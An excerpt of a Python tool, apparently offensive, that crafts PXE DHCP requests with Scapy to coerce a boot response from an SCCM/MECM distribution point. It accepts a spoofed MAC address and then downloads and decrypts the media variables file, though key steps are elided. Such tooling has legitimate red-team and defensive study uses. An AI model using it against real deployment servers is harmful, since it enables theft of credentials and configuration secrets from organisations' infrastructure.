...
# PXE Client Architecture types (RFC 4578 / IANA dhcpv6-parameters)
...
PXE_ARCHITECTURES = [
    {
        ...
        'arch_id': 0,
        'option93': b'\x00\x00',
        'vendor_class': b'PXEClient:Arch:00000:UNDI:003000',
        'option250': binascii.unhexlify("0d0208000e010101020006050400000006ff"),
    },
    {
        'name': 'x86 UEFI',
        'arch_id': 6,
        'option93': b'\x00\x06',
        'vendor_class': b'PXEClient:Arch:00006:UNDI:003000',
        'option250': binascii.unhexlify("0c01010d020800010200060e0101050400000011ff"),
    },
    {
        'name': 'x64 UEFI',
        'arch_id': 7,
        'option93': b'\x00\x07',
        'vendor_class': b'PXEClient:Arch:00007:UNDI:003000',
        'option250': binascii.unhexlify("0c01010d020800010200070e0101050400000011ff"),
    },
    {
        'name': 'EFI BC',
        'arch_id': 9,
        'option93': b'\x00\x09',
        'vendor_class': b'PXEClient:Arch:00009:UNDI:003000',
        'option250': binascii.unhexlify("0c01010d020800010200090e0101050400000011ff"),
    },
]
...
def find_pxe_server():
    ...
    if boot_file and "abortpxe" in boot_file.lower():
        print("[-] PXE server responded with abort boot file: " + boot_file)
        print("[-] This device's MAC address is not approved for PXE boot in SCCM/MECM. The device must be marked for deployment (e.g. added to a collection or registered as an unknown computer) before PXE boot will be allowed.")
        sys.exit(-1)
...
def get_variable_file_path(tftp_server, arch=None):

    if arch is None:
        arch = PXE_ARCHITECTURES[0]

    print("")
    print("[+] Asking ConfigMgr for location to download the media variables and BCD files [%s]..." % arch['name'])
    print("")
    ...
    dst_mac = getmacbyip(tftp_server)
    if dst_mac is None:
        dst_mac = "ff:ff:ff:ff:ff:ff"

    pkt = Ether(dst=dst_mac)/IP(src=clientIPAddress,dst=tftp_server)/UDP(sport=68,dport=4011)/BOOTP(ciaddr=clientIPAddress,chaddr=clientMacAddress)/DHCP(options=[
    ("message-type","request"),
    ('param_req_list',[3, 1, 60, 128, 129, 130, 131, 132, 133, 134, 135]),
    ('pxe_client_architecture', arch['option93']),
    (94, b'\x01\x03\x00'), #Client NDI - UNDI
    (250, arch['option250']),
    ('vendor_class_id', arch['vendor_class']),
    ('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'),
    "end"])

    conf.checkIPaddr = False
    ans = srp1(pkt,timeout=10,iface=conf.iface,verbose=2,filter="udp port 4011 or udp port 68")
    conf.checkIPaddr = True
    ...
    if ans:
        ...
        try:
            boot_file_field = packet[BOOTP].file.rstrip(b"\x00").decode("utf-8", errors="ignore")
        except:
            boot_file_field = ""
        if boot_file_field and "abortpxe" in boot_file_field.lower():
            print("[-] PXE server responded with abort boot file for %s: %s" % (arch['name'], boot_file_field))
            return None
...
def get_pxe_files(ip):
    ...
    for arch in PXE_ARCHITECTURES:
        result = get_variable_file_path(tftp_server_ip, arch)
        if result is not None:
            print("[+] Got valid response for architecture: %s" % arch['name'])
            answer_array = result
            break

    if answer_array is None:
        print("[-] No architecture received a valid PXE response. This may indicate the MAC address is not approved, the server is unreachable, or firewall rules are blocking DHCP packets.")
        sys.exit(-1)
...
def decrypt_media_file(path, password):
    ...
    try:
        ...
        print("[-] Failed to decrypt media variables file: %s: %s" % (type(e).__name__, e))
        print("[-] This may indicate the derived key is incorrect, or the downloaded .var file is corrupted/truncated")
        sys.exit(-1)
...
"""
    ...
    if len(sys.argv) < 2 or sys.argv[1] == "-h":
        ...
        print("%s 2 <IP Address of DP Server> [MAC Address] - Coerce PXE Boot against a specific MECM Distribution Point server designated by IP address. Optionally specify a MAC address (e.g. AA:BB:CC:DD:EE:FF) to use in the DHCP packet instead of the local interface MAC" % sys.argv[0])
        ...
        if len(sys.argv) < 3 or len(sys.argv) > 4:
            print("Usage:   %s 2 <ip addess of MECM server> [MAC address]" % sys.argv[0])
            sys.exit(0)
        ...
        if len(sys.argv) == 4:
            clientMacAddress = mac2str(sys.argv[3])
            print("[+] Using manually specified MAC address: " + sys.argv[3])
